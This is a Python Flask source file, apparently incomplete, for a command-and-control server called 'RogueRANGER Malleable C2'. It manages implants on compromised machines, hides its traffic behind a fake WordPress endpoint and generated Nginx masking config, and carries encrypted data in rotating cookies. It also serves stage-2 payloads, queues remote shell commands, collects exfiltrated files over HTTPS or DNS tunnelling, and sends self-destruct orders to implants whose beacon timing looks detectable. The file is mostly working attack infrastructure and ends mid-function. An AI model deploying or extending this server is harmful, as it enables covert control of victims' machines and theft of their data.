#!/usr/bin/env python3

"""
c2.py 

"""
import sys
import os
import json
import base64
import hashlib
import uuid
import sqlite3
import time
import re
import random
import socket
import threading
import subprocess
from datetime import datetime, timedelta
from collections import defaultdict
from pathlib import Path
from typing import Dict, List, Optional, Tuple, Any

from flask import Flask, request, jsonify, send_file, Response
from cryptography.fernet import Fernet
from Cryptodome.Cipher import AES

# Try to import DNS tunnel module from payloads
try:
    sys.path.append(os.path.join(os.path.dirname(__file__), 'payloads'))
    from dnstunnel import DNSFragmenter, DNSListener
    DNS_AVAILABLE = True
except ImportError:
    DNS_AVAILABLE = False
    print("[!] DNS tunnel module not found. Exfiltration will use HTTPS only.")

app = Flask(__name__)
app.secret_key = 'RogueC2_Malleable_v1'

# ========== Configuration ==========
C2_PORT = 4444
C2_HOST = '0.0.0.0'
BASE_DIR = Path(__file__).parent
PAYLOAD_DIR = BASE_DIR / "payloads"
UPLOAD_DIR = BASE_DIR / "uploads"
NGINX_DIR = BASE_DIR / "nginx"
DB_PATH = BASE_DIR / "implants.db"

# Create directories
PAYLOAD_DIR.mkdir(exist_ok=True)
UPLOAD_DIR.mkdir(exist_ok=True)
NGINX_DIR.mkdir(exist_ok=True)

# DNS tunnel configuration
DNS_DOMAIN = "updates.your-domain.com"  # Change to your domain
DNS_LISTEN_PORT = 53

# Legacy key (for backward compatibility)
LEGACY_SECRET_KEY = b'6767BabyROGUE!&%5'

# In-memory stores
session_keys = {}                    # implant_id -> Fernet key
pending_keys = {}                    # fingerprint -> (key, timestamp)
pending_commands = defaultdict(list) # implant_id -> list of commands
beacon_timings = defaultdict(list)   # implant_id -> list of timestamps
process_history = defaultdict(list)  # implant_id -> list of (process, timestamp)
exfil_queue = defaultdict(list)      # implant_id -> queued exfil data

# DNS tunnel instances
dns_listener = None
dns_tunnels = {}                      # implant_id -> DNSFragmenter instance

# Cookie names to check (malleable)
COOKIE_NAMES = [
    '_ga', '_gid', '_fbp', 'xsid', 'PHPSESSID', 
    'wordpress_', 'wp-settings-', 'sessionid', 'csrftoken',
    'AWSALB', 'remember_me', 'auth_token', 'session'
]

# ========== Database ==========
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    
    # Implants table
    c.execute('''
        CREATE TABLE IF NOT EXISTS implants (
            implant_id TEXT PRIMARY KEY,
            implant_hash TEXT,
            target_process TEXT,
            phase1_enabled BOOLEAN DEFAULT 0,
            vm_detection_data TEXT,
            cloud_info TEXT,
            session_key TEXT,
            first_seen DATETIME,
            last_beacon DATETIME,
            beacon_count INTEGER DEFAULT 0,
            commands_sent INTEGER DEFAULT 0,
            results_received INTEGER DEFAULT 0,
            jitter_score REAL DEFAULT 1.0,
            flagged BOOLEAN DEFAULT 0,
            dns_tunnel BOOLEAN DEFAULT 0,
            last_dns_query DATETIME
        )
    ''')
    
    # Commands table
    c.execute('''
        CREATE TABLE IF NOT EXISTS commands (
            command_id TEXT PRIMARY KEY,
            implant_id TEXT,
            command_type TEXT,
            command_payload TEXT,
            created_at DATETIME,
            executed_at DATETIME,
            result TEXT,
            status TEXT DEFAULT 'pending',
            channel TEXT DEFAULT 'https'  -- 'https' or 'dns'
        )
    ''')
    
    # Process history
    c.execute('''
        CREATE TABLE IF NOT EXISTS process_history (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            implant_id TEXT,
            process_name TEXT,
            seen_at DATETIME
        )
    ''')
    
    # Exfiltrated data
    c.execute('''
        CREATE TABLE IF NOT EXISTS exfiltrated_data (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            implant_id TEXT,
            data_type TEXT,
            data TEXT,
            received_at DATETIME,
            channel TEXT
        )
    ''')
    
    conn.commit()
    conn.close()

init_db()

# ========== Nginx Configuration Generator ==========
def generate_nginx_config(domain: str = "_", cert_path: str = None, key_path: str = None):
    """Generate WordPress-mimicking Nginx config."""
    cert = cert_path or "/etc/ssl/certs/nginx-selfsigned.crt"
    key = key_path or "/etc/ssl/private/nginx-selfsigned.key"
    
    config = f"""
server {{
    listen 443 ssl http2;
    server_name {domain};

    ssl_certificate {cert};
    ssl_certificate_key {key};

    # Security headers (looks legit)
    add_header X-Frame-Options "SAMEORIGIN" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header Referrer-Policy "no-referrer-when-downgrade" always;

    # WordPress admin-ajax.php - main C2 channel
    location ~ ^/wp-admin/admin-ajax.php$ {{
        # Only allow our implant's user agent
        if ($http_user_agent !~ "Mozilla/5.0 \\(Windows NT 10.0; Win64; x64\\) AppleWebKit/537.36") {{
            return 302 https://wordpress.org;
        }}

        # Rate limiting for implant
        limit_req zone=implant burst=5 nodelay;
        
        # Forward to C2
        proxy_pass http://127.0.0.1:{C2_PORT};
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }}

    # wp-content - looks like a real WordPress site
    location /wp-content/ {{
        alias /var/www/html/wp-content/;
        expires 30d;
        add_header Cache-Control "public, no-transform";
    }}

    # wp-includes
    location /wp-includes/ {{
        alias /var/www/html/wp-includes/;
        expires 30d;
        add_header Cache-Control "public, no-transform";
    }}

    # XML-RPC - often attacked, so we return 404
    location = /xmlrpc.php {{
        return 404;
    }}

    # Everything else -> WordPress or redirect
    location / {{
        try_files $uri $uri/ /index.php?$args;
        
        # If file doesn't exist, redirect to WordPress.org
        if (!-e $request_filename) {{
            return 302 https://wordpress.org$request_uri;
        }}
    }}

    # PHP handling (for the fake WordPress)
    location ~ \.php$ {{
        include snippets/fastcgi-php.conf;
        fastcgi_pass unix:/var/run/php/php7.4-fpm.sock;
    }}
}}
"""
    config_path = NGINX_DIR / "wordpress-mask.conf"
    with open(config_path, 'w') as f:
        f.write(config)
    return config_path

# ========== DNS Tunnel Integration ==========
class DNSExfilManager:
    """Manages DNS-based exfiltration for implants."""
    
    def __init__(self, domain: str):
        self.domain = domain
        self.listener = None
        self.running = False
        self.thread = None
        
    def start_listener(self):
        """Start DNS listener in background thread."""
        if not DNS_AVAILABLE:
            print("[!] DNS tunnel not available")
            return False
            
        self.running = True
        self.thread = threading.Thread(target=self._run_listener)
        self.thread.daemon = True
        self.thread.start()
        print(f"[+] DNS listener started on port {DNS_LISTEN_PORT}")
        return True
        
    def _run_listener(self):
        """Run DNS listener."""
        try:
            self.listener = DNSListener(self.domain)
            self.listener.start()
        except Exception as e:
            print(f"[-] DNS listener error: {e}")
            
    def queue_for_exfil(self, implant_id: str, data: bytes, filename: str = None):
        """Queue data for DNS exfiltration."""
        if implant_id not in dns_tunnels:
            dns_tunnels[implant_id] = DNSFragmenter(self.domain)
        
        # Store in database
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('''
            INSERT INTO exfiltrated_data (implant_id, data_type, data, received_at, channel)
            VALUES (?, ?, ?, ?, 'dns')
        ''', (implant_id, filename or 'unknown', base64.b64encode(data).decode(), datetime.now().isoformat()))
        conn.commit()
        conn.close()
        
        # Queue for sending
        exfil_queue[implant_id].append((data, filename))
        
    def process_queue(self):
        """Process exfiltration queue (called periodically)."""
        for implant_id, queue in list(exfil_queue.items()):
            if not queue:
                continue
                
            tunnel = dns_tunnels.get(implant_id)
            if not tunnel:
                continue
                
            # Send up to 5 items per cycle to avoid flooding
            for _ in range(min(5, len(queue))):
                data, filename = queue.pop(0)
                try:
                    tunnel.fragment_and_send(data, filename)
                    time.sleep(random.uniform(1, 3))  # Jitter between DNS queries
                except Exception as e:
                    print(f"[-] DNS exfil error for {implant_id}: {e}")
                    # Re-queue for retry
                    queue.insert(0, (data, filename))
                    break

# ========== Helper Functions ==========
def get_session_key(implant_id):
    if implant_id in session_keys:
        return session_keys[implant_id]
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('SELECT session_key FROM implants WHERE implant_id = ?', (implant_id,))
    row = c.fetchone()
    conn.close()
    if row and row[0]:
        key = base64.b64decode(row[0])
        session_keys[implant_id] = key
        return key
    return None

def store_session_key(implant_id, key):
    session_keys[implant_id] = key
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('UPDATE implants SET session_key = ? WHERE implant_id = ?',
              (base64.b64encode(key).decode(), implant_id))
    conn.commit()
    conn.close()

def legacy_encrypt(msg: str) -> bytes:
    cipher = AES.new(LEGACY_SECRET_KEY, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(msg.encode('utf-8'))
    return base64.b64encode(cipher.nonce + tag + ciphertext)

def legacy_decrypt(data: bytes) -> str:
    raw = base64.b64decode(data)
    nonce, tag, ciphertext = raw[:16], raw[16:32], raw[32:]
    cipher = AES.new(LEGACY_SECRET_KEY, AES.MODE_EAX, nonce)
    return cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8')

def extract_data_from_cookie(request):
    """Extract encrypted data from any of several possible cookie names."""
    cookie_header = request.headers.get('Cookie', '')
    
    for name in COOKIE_NAMES:
        pattern = f'{name}=([^;]+)'
        match = re.search(pattern, cookie_header)
        if match:
            try:
                encoded = match.group(1)
                decoded = urllib.parse.unquote(encoded)
                return base64.b64decode(decoded)
            except:
                continue
    
    # Try legacy cookie name
    if 'session=' in cookie_header:
        try:
            encoded = cookie_header.split('session=')[1].split(';')[0]
            return base64.b64decode(encoded)
        except:
            pass
    
    return request.get_data()

def get_implant_id_from_auth(request):
    auth = request.headers.get('Authorization', '')
    if auth.startswith('Bearer '):
        return auth[7:]
    return request.headers.get('X-Implant-ID')

def check_jitter(implant_id):
    """Check if beacon timing has suspiciously low variance."""
    timings = beacon_timings.get(implant_id, [])
    if len(timings) < 5:
        return True
    
    intervals = [timings[i+1] - timings[i] for i in range(len(timings)-1)]
    if not intervals:
        return True
        
    avg_interval = sum(intervals) / len(intervals)
    variance = sum((i - avg_interval) ** 2 for i in intervals) / len(intervals)
    
    return variance >= 0.5  # Less than 0.5s variance = suspicious

def store_process_history(implant_id, process_name):
    """Track process name changes."""
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''
        INSERT INTO process_history (implant_id, process_name, seen_at)
        VALUES (?, ?, ?)
    ''', (implant_id, process_name, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    
    process_history[implant_id].append((process_name, time.time()))
    if len(process_history[implant_id]) > 10:
        process_history[implant_id].pop(0)

def store_implant(beacon_data: dict, session_key: bytes = None):
    implant_id = beacon_data.get('id') or beacon_data.get('implant_id') or beacon_data.get('implant_hash')
    if not implant_id:
        return
    
    target_process = beacon_data.get('target', 'unknown')
    
    store_process_history(implant_id, target_process)
    
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    now = datetime.now().isoformat()
    c.execute('SELECT 1 FROM implants WHERE implant_id = ?', (implant_id,))
    exists = c.fetchone()
    
    jitter_ok = check_jitter(implant_id)
    jitter_score = 1.0 if jitter_ok else 0.0
    
    if exists:
        c.execute('''
            UPDATE implants SET
                last_beacon = ?,
                beacon_count = beacon_count + 1,
                target_process = ?,
                session_key = COALESCE(?, session_key),
                jitter_score = ?,
                flagged = CASE WHEN ? = 0 THEN 1 ELSE flagged END
            WHERE implant_id = ?
        ''', (
            now,
            target_process,
            base64.b64encode(session_key).decode() if session_key else None,
            jitter_score,
            jitter_ok,
            implant_id
        ))
    else:
        c.execute('''
            INSERT INTO implants (
                implant_id, implant_hash, target_process,
                session_key, first_seen, last_beacon, beacon_count,
                jitter_score
            ) VALUES (?, ?, ?, ?, ?, ?, 1, ?)
        ''', (
            implant_id,
            beacon_data.get('implant_hash', implant_id),
            target_process,
            base64.b64encode(session_key).decode() if session_key else None,
            now, now,
            jitter_score
        ))
    conn.commit()
    conn.close()

# ========== Stager Endpoints ==========
@app.route('/handshake', methods=['POST'])
def handshake():
    try:
        data = request.get_json()
        if not data:
            return jsonify({'error': 'No JSON'}), 400
        
        fingerprint = data.get('fp') or data.get('fingerprint')
        if not fingerprint:
            return jsonify({'error': 'Missing fingerprint'}), 400
        
        # Check if fingerprint exists
        if fingerprint in pending_keys:
            key, _ = pending_keys[fingerprint]
            return jsonify({'key': key.decode()})
        
        # Generate new key
        key = Fernet.generate_key()
        pending_keys[fingerprint] = (key, time.time())
        
        # Auto-cleanup after 5 minutes
        def cleanup():
            time.sleep(300)
            pending_keys.pop(fingerprint, None)
        threading.Thread(target=cleanup, daemon=True).start()
        
        return jsonify({'key': key.decode()})
        
    except Exception as e:
        # Send junk data on error
        junk_size = random.randint(1024, 10240)
        junk_data = os.urandom(junk_size)
        return Response(
            junk_data,
            mimetype='application/octet-stream',
            headers={'Content-Disposition': 'attachment; filename="update.bin"'}
        )

@app.route('/stage2/<path:filename>', methods=['GET'])
def serve_stage2(filename):
    """Serve payloads from payloads/ directory."""
    safe_path = PAYLOAD_DIR / filename
    if safe_path.resolve().parent != PAYLOAD_DIR.resolve():
        return "Invalid path", 403
    if safe_path.exists():
        return send_file(safe_path)
    return "Not found", 404

@app.route('/payloads/list', methods=['GET'])
def list_payloads():
    """List available payloads (authenticated)."""
    auth = request.headers.get('Authorization', '')
    if not auth.startswith('Bearer admin-token-here'):  # Change this!
        return jsonify({'error': 'Unauthorized'}), 401
        
    payloads = [f.name for f in PAYLOAD_DIR.glob('*.py')]
    return jsonify({'payloads': payloads})

# ========== Implant Beacon Endpoints ==========
@app.route('/api/v1/telemetry', methods=['POST'])
@app.route('/wp-admin/admin-ajax.php', methods=['POST'])
def beacon_handler():
    try:
        encrypted = extract_data_from_cookie(request)
        implant_id = get_implant_id_from_auth(request)
        
        if not implant_id:
            return jsonify({'error': 'Missing authentication'}), 401
        
        # Track timing
        beacon_timings[implant_id].append(time.time())
        if len(beacon_timings[implant_id]) > 20:
            beacon_timings[implant_id].pop(0)
        
        key = get_session_key(implant_id)
        if not key:
            return jsonify({'error': 'No session key'}), 401
        
        f = Fernet(key)
        try:
            decrypted = f.decrypt(encrypted)
        except Exception:
            return jsonify({'error': 'Decryption failed'}), 400
        
        beacon_data = json.loads(decrypted.decode('utf-8'))
        
        # Check if implant wants DNS tunnel
        use_dns = beacon_data.get('use_dns', False)
        if use_dns and implant_id not in dns_tunnels and DNS_AVAILABLE:
            dns_tunnels[implant_id] = DNSFragmenter(DNS_DOMAIN)
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            c.execute('UPDATE implants SET dns_tunnel = 1 WHERE implant_id = ?', (implant_id,))
            conn.commit()
            conn.close()
        
        store_implant(beacon_data, key)
        
        # Check if implant is flagged
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('SELECT flagged FROM implants WHERE implant_id = ?', (implant_id,))
        row = c.fetchone()
        conn.close()
        
        if row and row[0]:
            pending_commands[implant_id].append({
                'id': 'self_destruct',
                'type': 'exit',
                'payload': {},
                'timestamp': datetime.now().isoformat()
            })
        
        # Get pending commands (filter by channel)
        pending = []
        for cmd in pending_commands.get(implant_id, []):
            cmd_channel = cmd.get('channel', 'https')
            if (cmd_channel == 'dns' and use_dns) or (cmd_channel == 'https' and not use_dns):
                pending.append(cmd)
        
        # Clear only the ones we're sending
        pending_commands[implant_id] = [c for c in pending_commands[implant_id] if c not in pending]
        
        response = {
            'tasks': pending,
            'use_dns': use_dns,
            'dns_domain': DNS_DOMAIN if use_dns else None,
            'timestamp': datetime.now().isoformat()
        }
        
        # Encrypt response
        resp_enc = f.encrypt(json.dumps(response).encode())
        encoded_resp = base64.b64encode(resp_enc).decode()
        
        cookie_name = random.choice(COOKIE_NAMES)
        response = app.response_class(
            response='',
            status=200,
            headers={
                'Set-Cookie': f'{cookie_name}={encoded_resp}; Path=/; HttpOnly; SameSite=Lax'
            }
        )
        return response
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/v1/results', methods=['POST'])
def result_handler():
    try:
        encrypted = extract_data_from_cookie(request)
        implant_id = get_implant_id_from_auth(request)
        
        if not implant_id:
            return jsonify({'error': 'Missing authentication'}), 401
        
        key = get_session_key(implant_id)
        if not key:
            return jsonify({'error': 'No session key'}), 401
        
        f = Fernet(key)
        try:
            decrypted = f.decrypt(encrypted)
        except Exception:
            return jsonify({'error': 'Decryption failed'}), 400
        
        result_data = json.loads(decrypted.decode('utf-8'))
        command_id = result_data.get('command_id')
        
        if command_id:
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            c.execute('''
                UPDATE commands SET
                    executed_at = ?,
                    result = ?,
                    status = 'completed'
                WHERE command_id = ? AND implant_id = ?
            ''', (
                datetime.now().isoformat(),
                json.dumps(result_data),
                command_id,
                implant_id
            ))
            conn.commit()
            conn.close()
        
        # Update stats
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('UPDATE implants SET results_received = results_received + 1 WHERE implant_id = ?',
                  (implant_id,))
        conn.commit()
        conn.close()
        
        # Return success
        resp_enc = f.encrypt(json.dumps({'status': 'ok'}).encode())
        encoded_resp = base64.b64encode(resp_enc).decode()
        cookie_name = random.choice(COOKIE_NAMES)
        response = app.response_class(
            response='',
            status=200,
            headers={'Set-Cookie': f'{cookie_name}={encoded_resp}; Path=/; HttpOnly; SameSite=Lax'}
        )
        return response
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/v1/uploads', methods=['POST'])
def upload_handler():
    try:
        encrypted = extract_data_from_cookie(request)
        implant_id = get_implant_id_from_auth(request)
        filename = request.headers.get('X-Filename', f'upload_{int(time.time())}.bin')
        
        if not implant_id:
            return jsonify({'error': 'Missing authentication'}), 401
        
        key = get_session_key(implant_id)
        if not key:
            return jsonify({'error': 'No session key'}), 401
        
        f = Fernet(key)
        try:
            file_data = f.decrypt(encrypted)
        except Exception:
            return jsonify({'error': 'Decryption failed'}), 400
        
        # Check if we should use DNS for this upload
        use_dns = request.headers.get('X-Use-DNS', '').lower() == 'true'
        
        if use_dns and DNS_AVAILABLE and implant_id in dns_tunnels:
            # Queue for DNS exfiltration
            dns_manager.queue_for_exfil(implant_id, file_data, filename)
            status = 'queued_for_dns'
        else:
            # Save directly
            safe_path = UPLOAD_DIR / f"{implant_id}_{filename}"
            with open(safe_path, 'wb') as out:
                out.write(file_data)
            status = 'saved'
        
        resp_enc = f.encrypt(json.dumps({'status': status}).encode())
        encoded_resp = base64.b64encode(resp_enc).decode()
        cookie_name = random.choice(COOKIE_NAMES)
        response = app.response_class(
            response='',
            status=200,
            headers={'Set-Cookie': f'{cookie_name}={encoded_resp}; Path=/; HttpOnly; SameSite=Lax'}
        )
        return response
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# ========== DNS Tunnel Endpoint (for receiving) ==========
@app.route('/dns/receive/<implant_id>/<chunk_id>', methods=['GET'])
def dns_receive(implant_id, chunk_id):
    """Endpoint for DNS tunnel to POST received data."""
    # This would be called by your DNS listener when it reconstructs data
    data = request.get_data()
    
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''
        INSERT INTO exfiltrated_data (implant_id, data_type, data, received_at, channel)
        VALUES (?, ?, ?, ?, 'dns')
    ''', (implant_id, f'chunk_{chunk_id}', base64.b64encode(data).decode(), datetime.now().isoformat()))
    conn.commit()
    conn.close()
    
    return jsonify({'status': 'received'})

# ========== Legacy Endpoint ==========
@app.route('/beacon', methods=['POST'])
@app.route('/', methods=['POST'])
def legacy_handler():
    try:
        data = request.get_data()
        if not data:
            return legacy_encrypt(json.dumps({'error': 'No data'})), 400
        
        try:
            decrypted = legacy_decrypt(data)
        except:
            return legacy_encrypt(json.dumps({'error': 'Decryption failed'})), 400
        
        if decrypted == "beacon":
            bot_id = f"legacy_{request.remote_addr}"
            pending = pending_commands.get(bot_id, [])
            response = {'commands': pending}
            if pending:
                pending_commands[bot_id] = []
            return legacy_encrypt(json.dumps(response)), 200
        
        try:
            beacon_data = json.loads(decrypted)
            implant_id = beacon_data.get('implant_id')
            if implant_id:
                store_implant(beacon_data, None)
                pending = pending_commands.get(implant_id, [])
                response = {'commands': pending}
                if pending:
                    pending_commands[implant_id] = []
                return legacy_encrypt(json.dumps(response)), 200
        except:
            pass
        
        return legacy_encrypt(json.dumps({'error': 'Unknown command'})), 400
        
    except Exception as e:
        return legacy_encrypt(json.dumps({'error': str(e)})), 500

# ========== Command Management ==========
@app.route('/phase1/command', methods=['POST'])
def add_command():
    try:
        data = request.get_json()
        if not data:
            return jsonify({'error': 'No JSON'}), 400
        
        implant_id = data.get('implant_id')
        task_type = data.get('type') or data.get('task_type')
        payload = data.get('payload', {})
        channel = data.get('channel', 'https')  # 'https' or 'dns'
        
        if not implant_id or not task_type:
            return jsonify({'error': 'Missing implant_id or type'}), 400
        
        command_id = str(uuid.uuid4())[:8]
        command = {
            'id': command_id,
            'type': task_type,
            'payload': payload,
            'timestamp': datetime.now().isoformat(),
            'channel': channel
        }
        
        # Store in database
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('''
            INSERT INTO commands
            (command_id, implant_id, command_type, command_payload, created_at, status, channel)
            VALUES (?, ?, ?, ?, ?, 'pending', ?)
        ''', (
            command_id,
            implant_id,
            task_type,
            json.dumps(payload),
            datetime.now().isoformat(),
            channel
        ))
        conn.commit()
        conn.close()
        
        # Add to pending
        pending_commands[implant_id].append(command)
        
        # Update stats
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('UPDATE implants SET commands_sent = commands_sent + 1 WHERE implant_id = ?',
                  (implant_id,))
        conn.commit()
        conn.close()
        
        return jsonify({
            'success': True,
            'command_id': command_id
        }), 200
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# ========== Dashboard & List ==========
@app.route('/phase1/implants', methods=['GET'])
def list_implants():
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('''
            SELECT implant_id, implant_hash, target_process,
                   first_seen, last_beacon, beacon_count,
                   commands_sent, results_received, jitter_score, flagged,
                   dns_tunnel
            FROM implants
            ORDER BY last_beacon DESC
        ''')
        implants = []
        for row in c.fetchall():
            implants.append({
                'implant_id': row[0],
                'implant_hash': row[1],
                'target_process': row[2],
                'first_seen': row[3],
                'last_beacon': row[4],
                'beacon_count': row[5],
                'commands_sent': row[6],
                'results_received': row[7],
                'jitter_score': row[8],
                'flagged': bool(row[9]),
                'dns_tunnel': bool(row[10])
            })
        conn.close()
        return jsonify({'success': True, 'implants': implants, 'count': len(implants)})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/phase1/exfiltrated/<implant_id>', methods=['GET'])
def list_exfiltrated(implant_id):
    """List exfiltrated data for an implant."""
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('''
            SELECT data_type, data, received_at, channel
            FROM exfiltrated_data
            WHERE implant_id = ?
            ORDER BY received_at DESC
        ''', (implant_id,))
        data = [{
            'type': row[0],
            'data': row[1][:100] + '...' if len(row[1]) > 100 else row[1],
            'received': row[2],
            'channel': row[3]
        } for row in c.fetchall()]
        conn.close()
        return jsonify({'success': True, 'data': data})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/phase1/dashboard', methods=['GET'])
def dashboard():
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>RogueRANGER Malleable C2</title>
        <style>
            body { font-family: monospace; margin: 20px; background: #111; color: #0f0; }
            h1 { color: #f0f; }
            .container { max-width: 1400px; margin: 0 auto; }
            .stats { display: grid; grid-template-columns: repeat(5, 1fr); gap: 20px; margin: 20px 0; }
            .stat-box { background: #222; padding: 15px; border-radius: 5px; border: 1px solid #0f0; }
            .stat-value { font-size: 24px; font-weight: bold; color: #0f0; }
            .flagged { color: #ff4444; }
            .dns { color: #44ff44; background: #224422; }
            button { background: #333; color: #0f0; border: 1px solid #0f0; padding: 8px 15px; cursor: pointer; }
            button:hover { background: #0f0; color: #000; }
            table { width: 100%; border-collapse: collapse; margin-top: 20px; }
            th, td { border: 1px solid #0f0; padding: 8px; text-align: left; }
            th { background: #222; }
            .tab { overflow: hidden; border: 1px solid #0f0; background: #222; }
            .tab button { background: inherit; float: left; border: none; outline: none; cursor: pointer; padding: 14px 16px; }
            .tab button:hover { background: #333; }
            .tab button.active { background: #0f0; color: #000; }
            .tabcontent { display: none; padding: 20px; border: 1px solid #0f0; border-top: none; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>RogueRANGER Malleable C2</h1>
            <p>WordPress Mask + DNS Tunnel | Payloads: ''' + str(len(list(PAYLOAD_DIR.glob('*.py')))) + ''' available</p>

            <div class="stats">
                <div class="stat-box">
                    <div>Total Implants</div>
                    <div class="stat-value" id="total-implants">Loading...</div>
                </div>
                <div class="stat-box">
                    <div>Online Now</div>
                    <div class="stat-value" id="online-implants">Loading...</div>
                </div>
                <div class="stat-box">
                    <div>DNS Enabled</div>
                    <div class="stat-value" id="dns-implants">Loading...</div>
                </div>
                <div class="stat-box">
                    <div>Flagged</div>
                    <div class="stat-value" id="flagged-implants">Loading...</div>
                </div>
                <div class="stat-box">
                    <div>Commands Sent</div>
                    <div class="stat-value" id="commands-total">Loading...</div>
                </div>
            </div>

            <div class="tab">
                <button class="tablinks active" onclick="openTab(event, 'Implants')">Implants</button>
                <button class="tablinks" onclick="openTab(event, 'Payloads')">Payloads</button>
                <button class="tablinks" onclick="openTab(event, 'DNS Exfil')">DNS Exfil</button>
                <button class="tablinks" onclick="openTab(event, 'Config')">Config</button>
            </div>

            <div id="Implants" class="tabcontent" style="display:block">
                <h2>Active Implants</h2>
                <div id="implants-list"></div>
            </div>

            <div id="Payloads" class="tabcontent">
                <h2>Available Payloads</h2>
                <div id="payloads-list"></div>
            </div>

            <div id="DNS Exfil" class="tabcontent">
                <h2>DNS Exfiltrated Data</h2>
                <select id="implant-select" onchange="loadExfilData()">
                    <option value="">Select implant...</option>
                </select>
                <div id="exfil-data"></div>
            </div>

            <div id="Config" class="tabcontent">
                <h2>Configuration</h2>
                <pre>
C2 Port: ''' + str(C2_PORT) + '''
DNS Domain: ''' + DNS_DOMAIN + '''
Payloads Dir: ''' + str(PAYLOAD_DIR) + '''
Nginx Config: ''' + str(NGINX_DIR / "wordpress-mask.conf") + '''
                </pre>
                <button onclick="generateNginx()">Generate Nginx Config</button>
                <div id="nginx-output"></div>
            </div>
        </div>

        <script>
            async function refreshData() {
                const resp = await fetch('/phase1/implants');
                const data = await resp.json();
                if (data.success) {
                    document.getElementById('total-implants').textContent = data.count;
                    
                    const now = new Date();
                    const online = data.implants.filter(i => {
                        const last = new Date(i.last_beacon);
                        return (now - last) < 300000;
                    }).length;
                    document.getElementById('online-implants').textContent = online;
                    
                    const dns = data.implants.filter(i => i.dns_tunnel).length;
                    document.getElementById('dns-implants').textContent = dns;
                    
                    const flagged = data.implants.filter(i => i.flagged).length;
                    document.getElementById('flagged-implants').textContent = flagged;
                    
                    const totalCmds = data.implants.reduce((s, i) => s + i.commands_sent, 0);
                    document.getElementById('commands-total').textContent = totalCmds;
                    
                    let html = '<table><tr><th>ID</th><th>Process</th><th>Jitter</th><th>DNS</th><th>Status</th><th>Last Seen</th><th>Beacons</th><th>Actions</th></tr>';
                    data.implants.slice(0, 20).forEach(i => {
                        const statusClass = i.flagged ? 'flagged' : '';
                        const dnsClass = i.dns_tunnel ? 'dns' : '';
                        const jitterColor = i.jitter_score > 0.8 ? '#0f0' : (i.jitter_score > 0.5 ? '#ff0' : '#f00');
                        html += `<tr>
                            <td>${i.implant_id.substring(0,8)}</td>
                            <td>${i.target_process || 'unknown'}</td>
                            <td style="color: ${jitterColor}">${i.jitter_score.toFixed(2)}</td>
                            <td class="${dnsClass}">${i.dns_tunnel ? '✓' : '✗'}</td>
                            <td class="${statusClass}">${i.flagged ? '⚠️ FLAGGED' : '✅ OK'}</td>
                            <td>${new Date(i.last_beacon).toLocaleTimeString()}</td>
                            <td>${i.beacon_count}</td>
                            <td>
                                <button onclick="sendCommand('${i.implant_id}', 'shell', 'whoami')">Shell</button>
                                <button onclick="sendCommand('${i.implant_id}', 'dnstunnel', '')">Enable DNS</button>
                                <button onclick="viewExfil('${i.implant_id}')">View Exfil</button>
                            </td>
                        </tr>`;
                        
                        // Add to implant select
                        let select = document.getElementById('implant-select');
                        let option = document.createElement('option');
                        option.value = i.implant_id;
                        option.text = i.implant_id.substring(0,8) + ' (' + i.target_process + ')';
                        select.appendChild(option);
                    });
                    html += '</table>';
                    document.getElementById('implants-list').innerHTML = html;
                }
            }

            async function sendCommand(implant_id, type, command) {
                const payload = type === 'shell' ? {command: command} : {};
                const channel = type === 'dnstunnel' ? 'dns' : 'https';
                
                const resp = await fetch('/phase1/command', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        implant_id: implant_id,
                        type: type,
                        payload: payload,
                        channel: channel
                    })
                });
                const data = await resp.json();
                alert('Command sent: ' + data.command_id);
            }

            async function loadExfilData() {
                const implant_id = document.getElementById('implant-select').value;
                if (!implant_id) return;
                
                const resp = await fetch('/phase1/exfiltrated/' + implant_id);
                const data = await resp.json();
                if (data.success) {
                    let html = '<table><tr><th>Type</th><th>Data</th><th>Channel</th><th>Received</th></tr>';
                    data.data.forEach(d => {
                        html += `<tr>
                            <td>${d.type}</td>
                            <td>${d.data}</td>
                            <td>${d.channel}</td>
                            <td>${new Date(d.received).toLocaleString()}</td>
                        </tr>`;
                    });
                    html += '</table>';
                    document.getElementById('exfil-data').innerHTML = html;
                }
            }

            async function loadPayloads() {
                const resp = await fetch('/payloads/list');
                const data = await resp.json();
                if (data.payloads) {
                    let html = '<ul>';
                    data.payloads.forEach(p => {
                        html += `<li>${p}</li>`;
                    });
                    html += '</ul>';
                    document.getElementById('payloads-list').innerHTML = html;
                }
            }

            function generateNginx() {
                document.getElementById('nginx-output').innerHTML = 
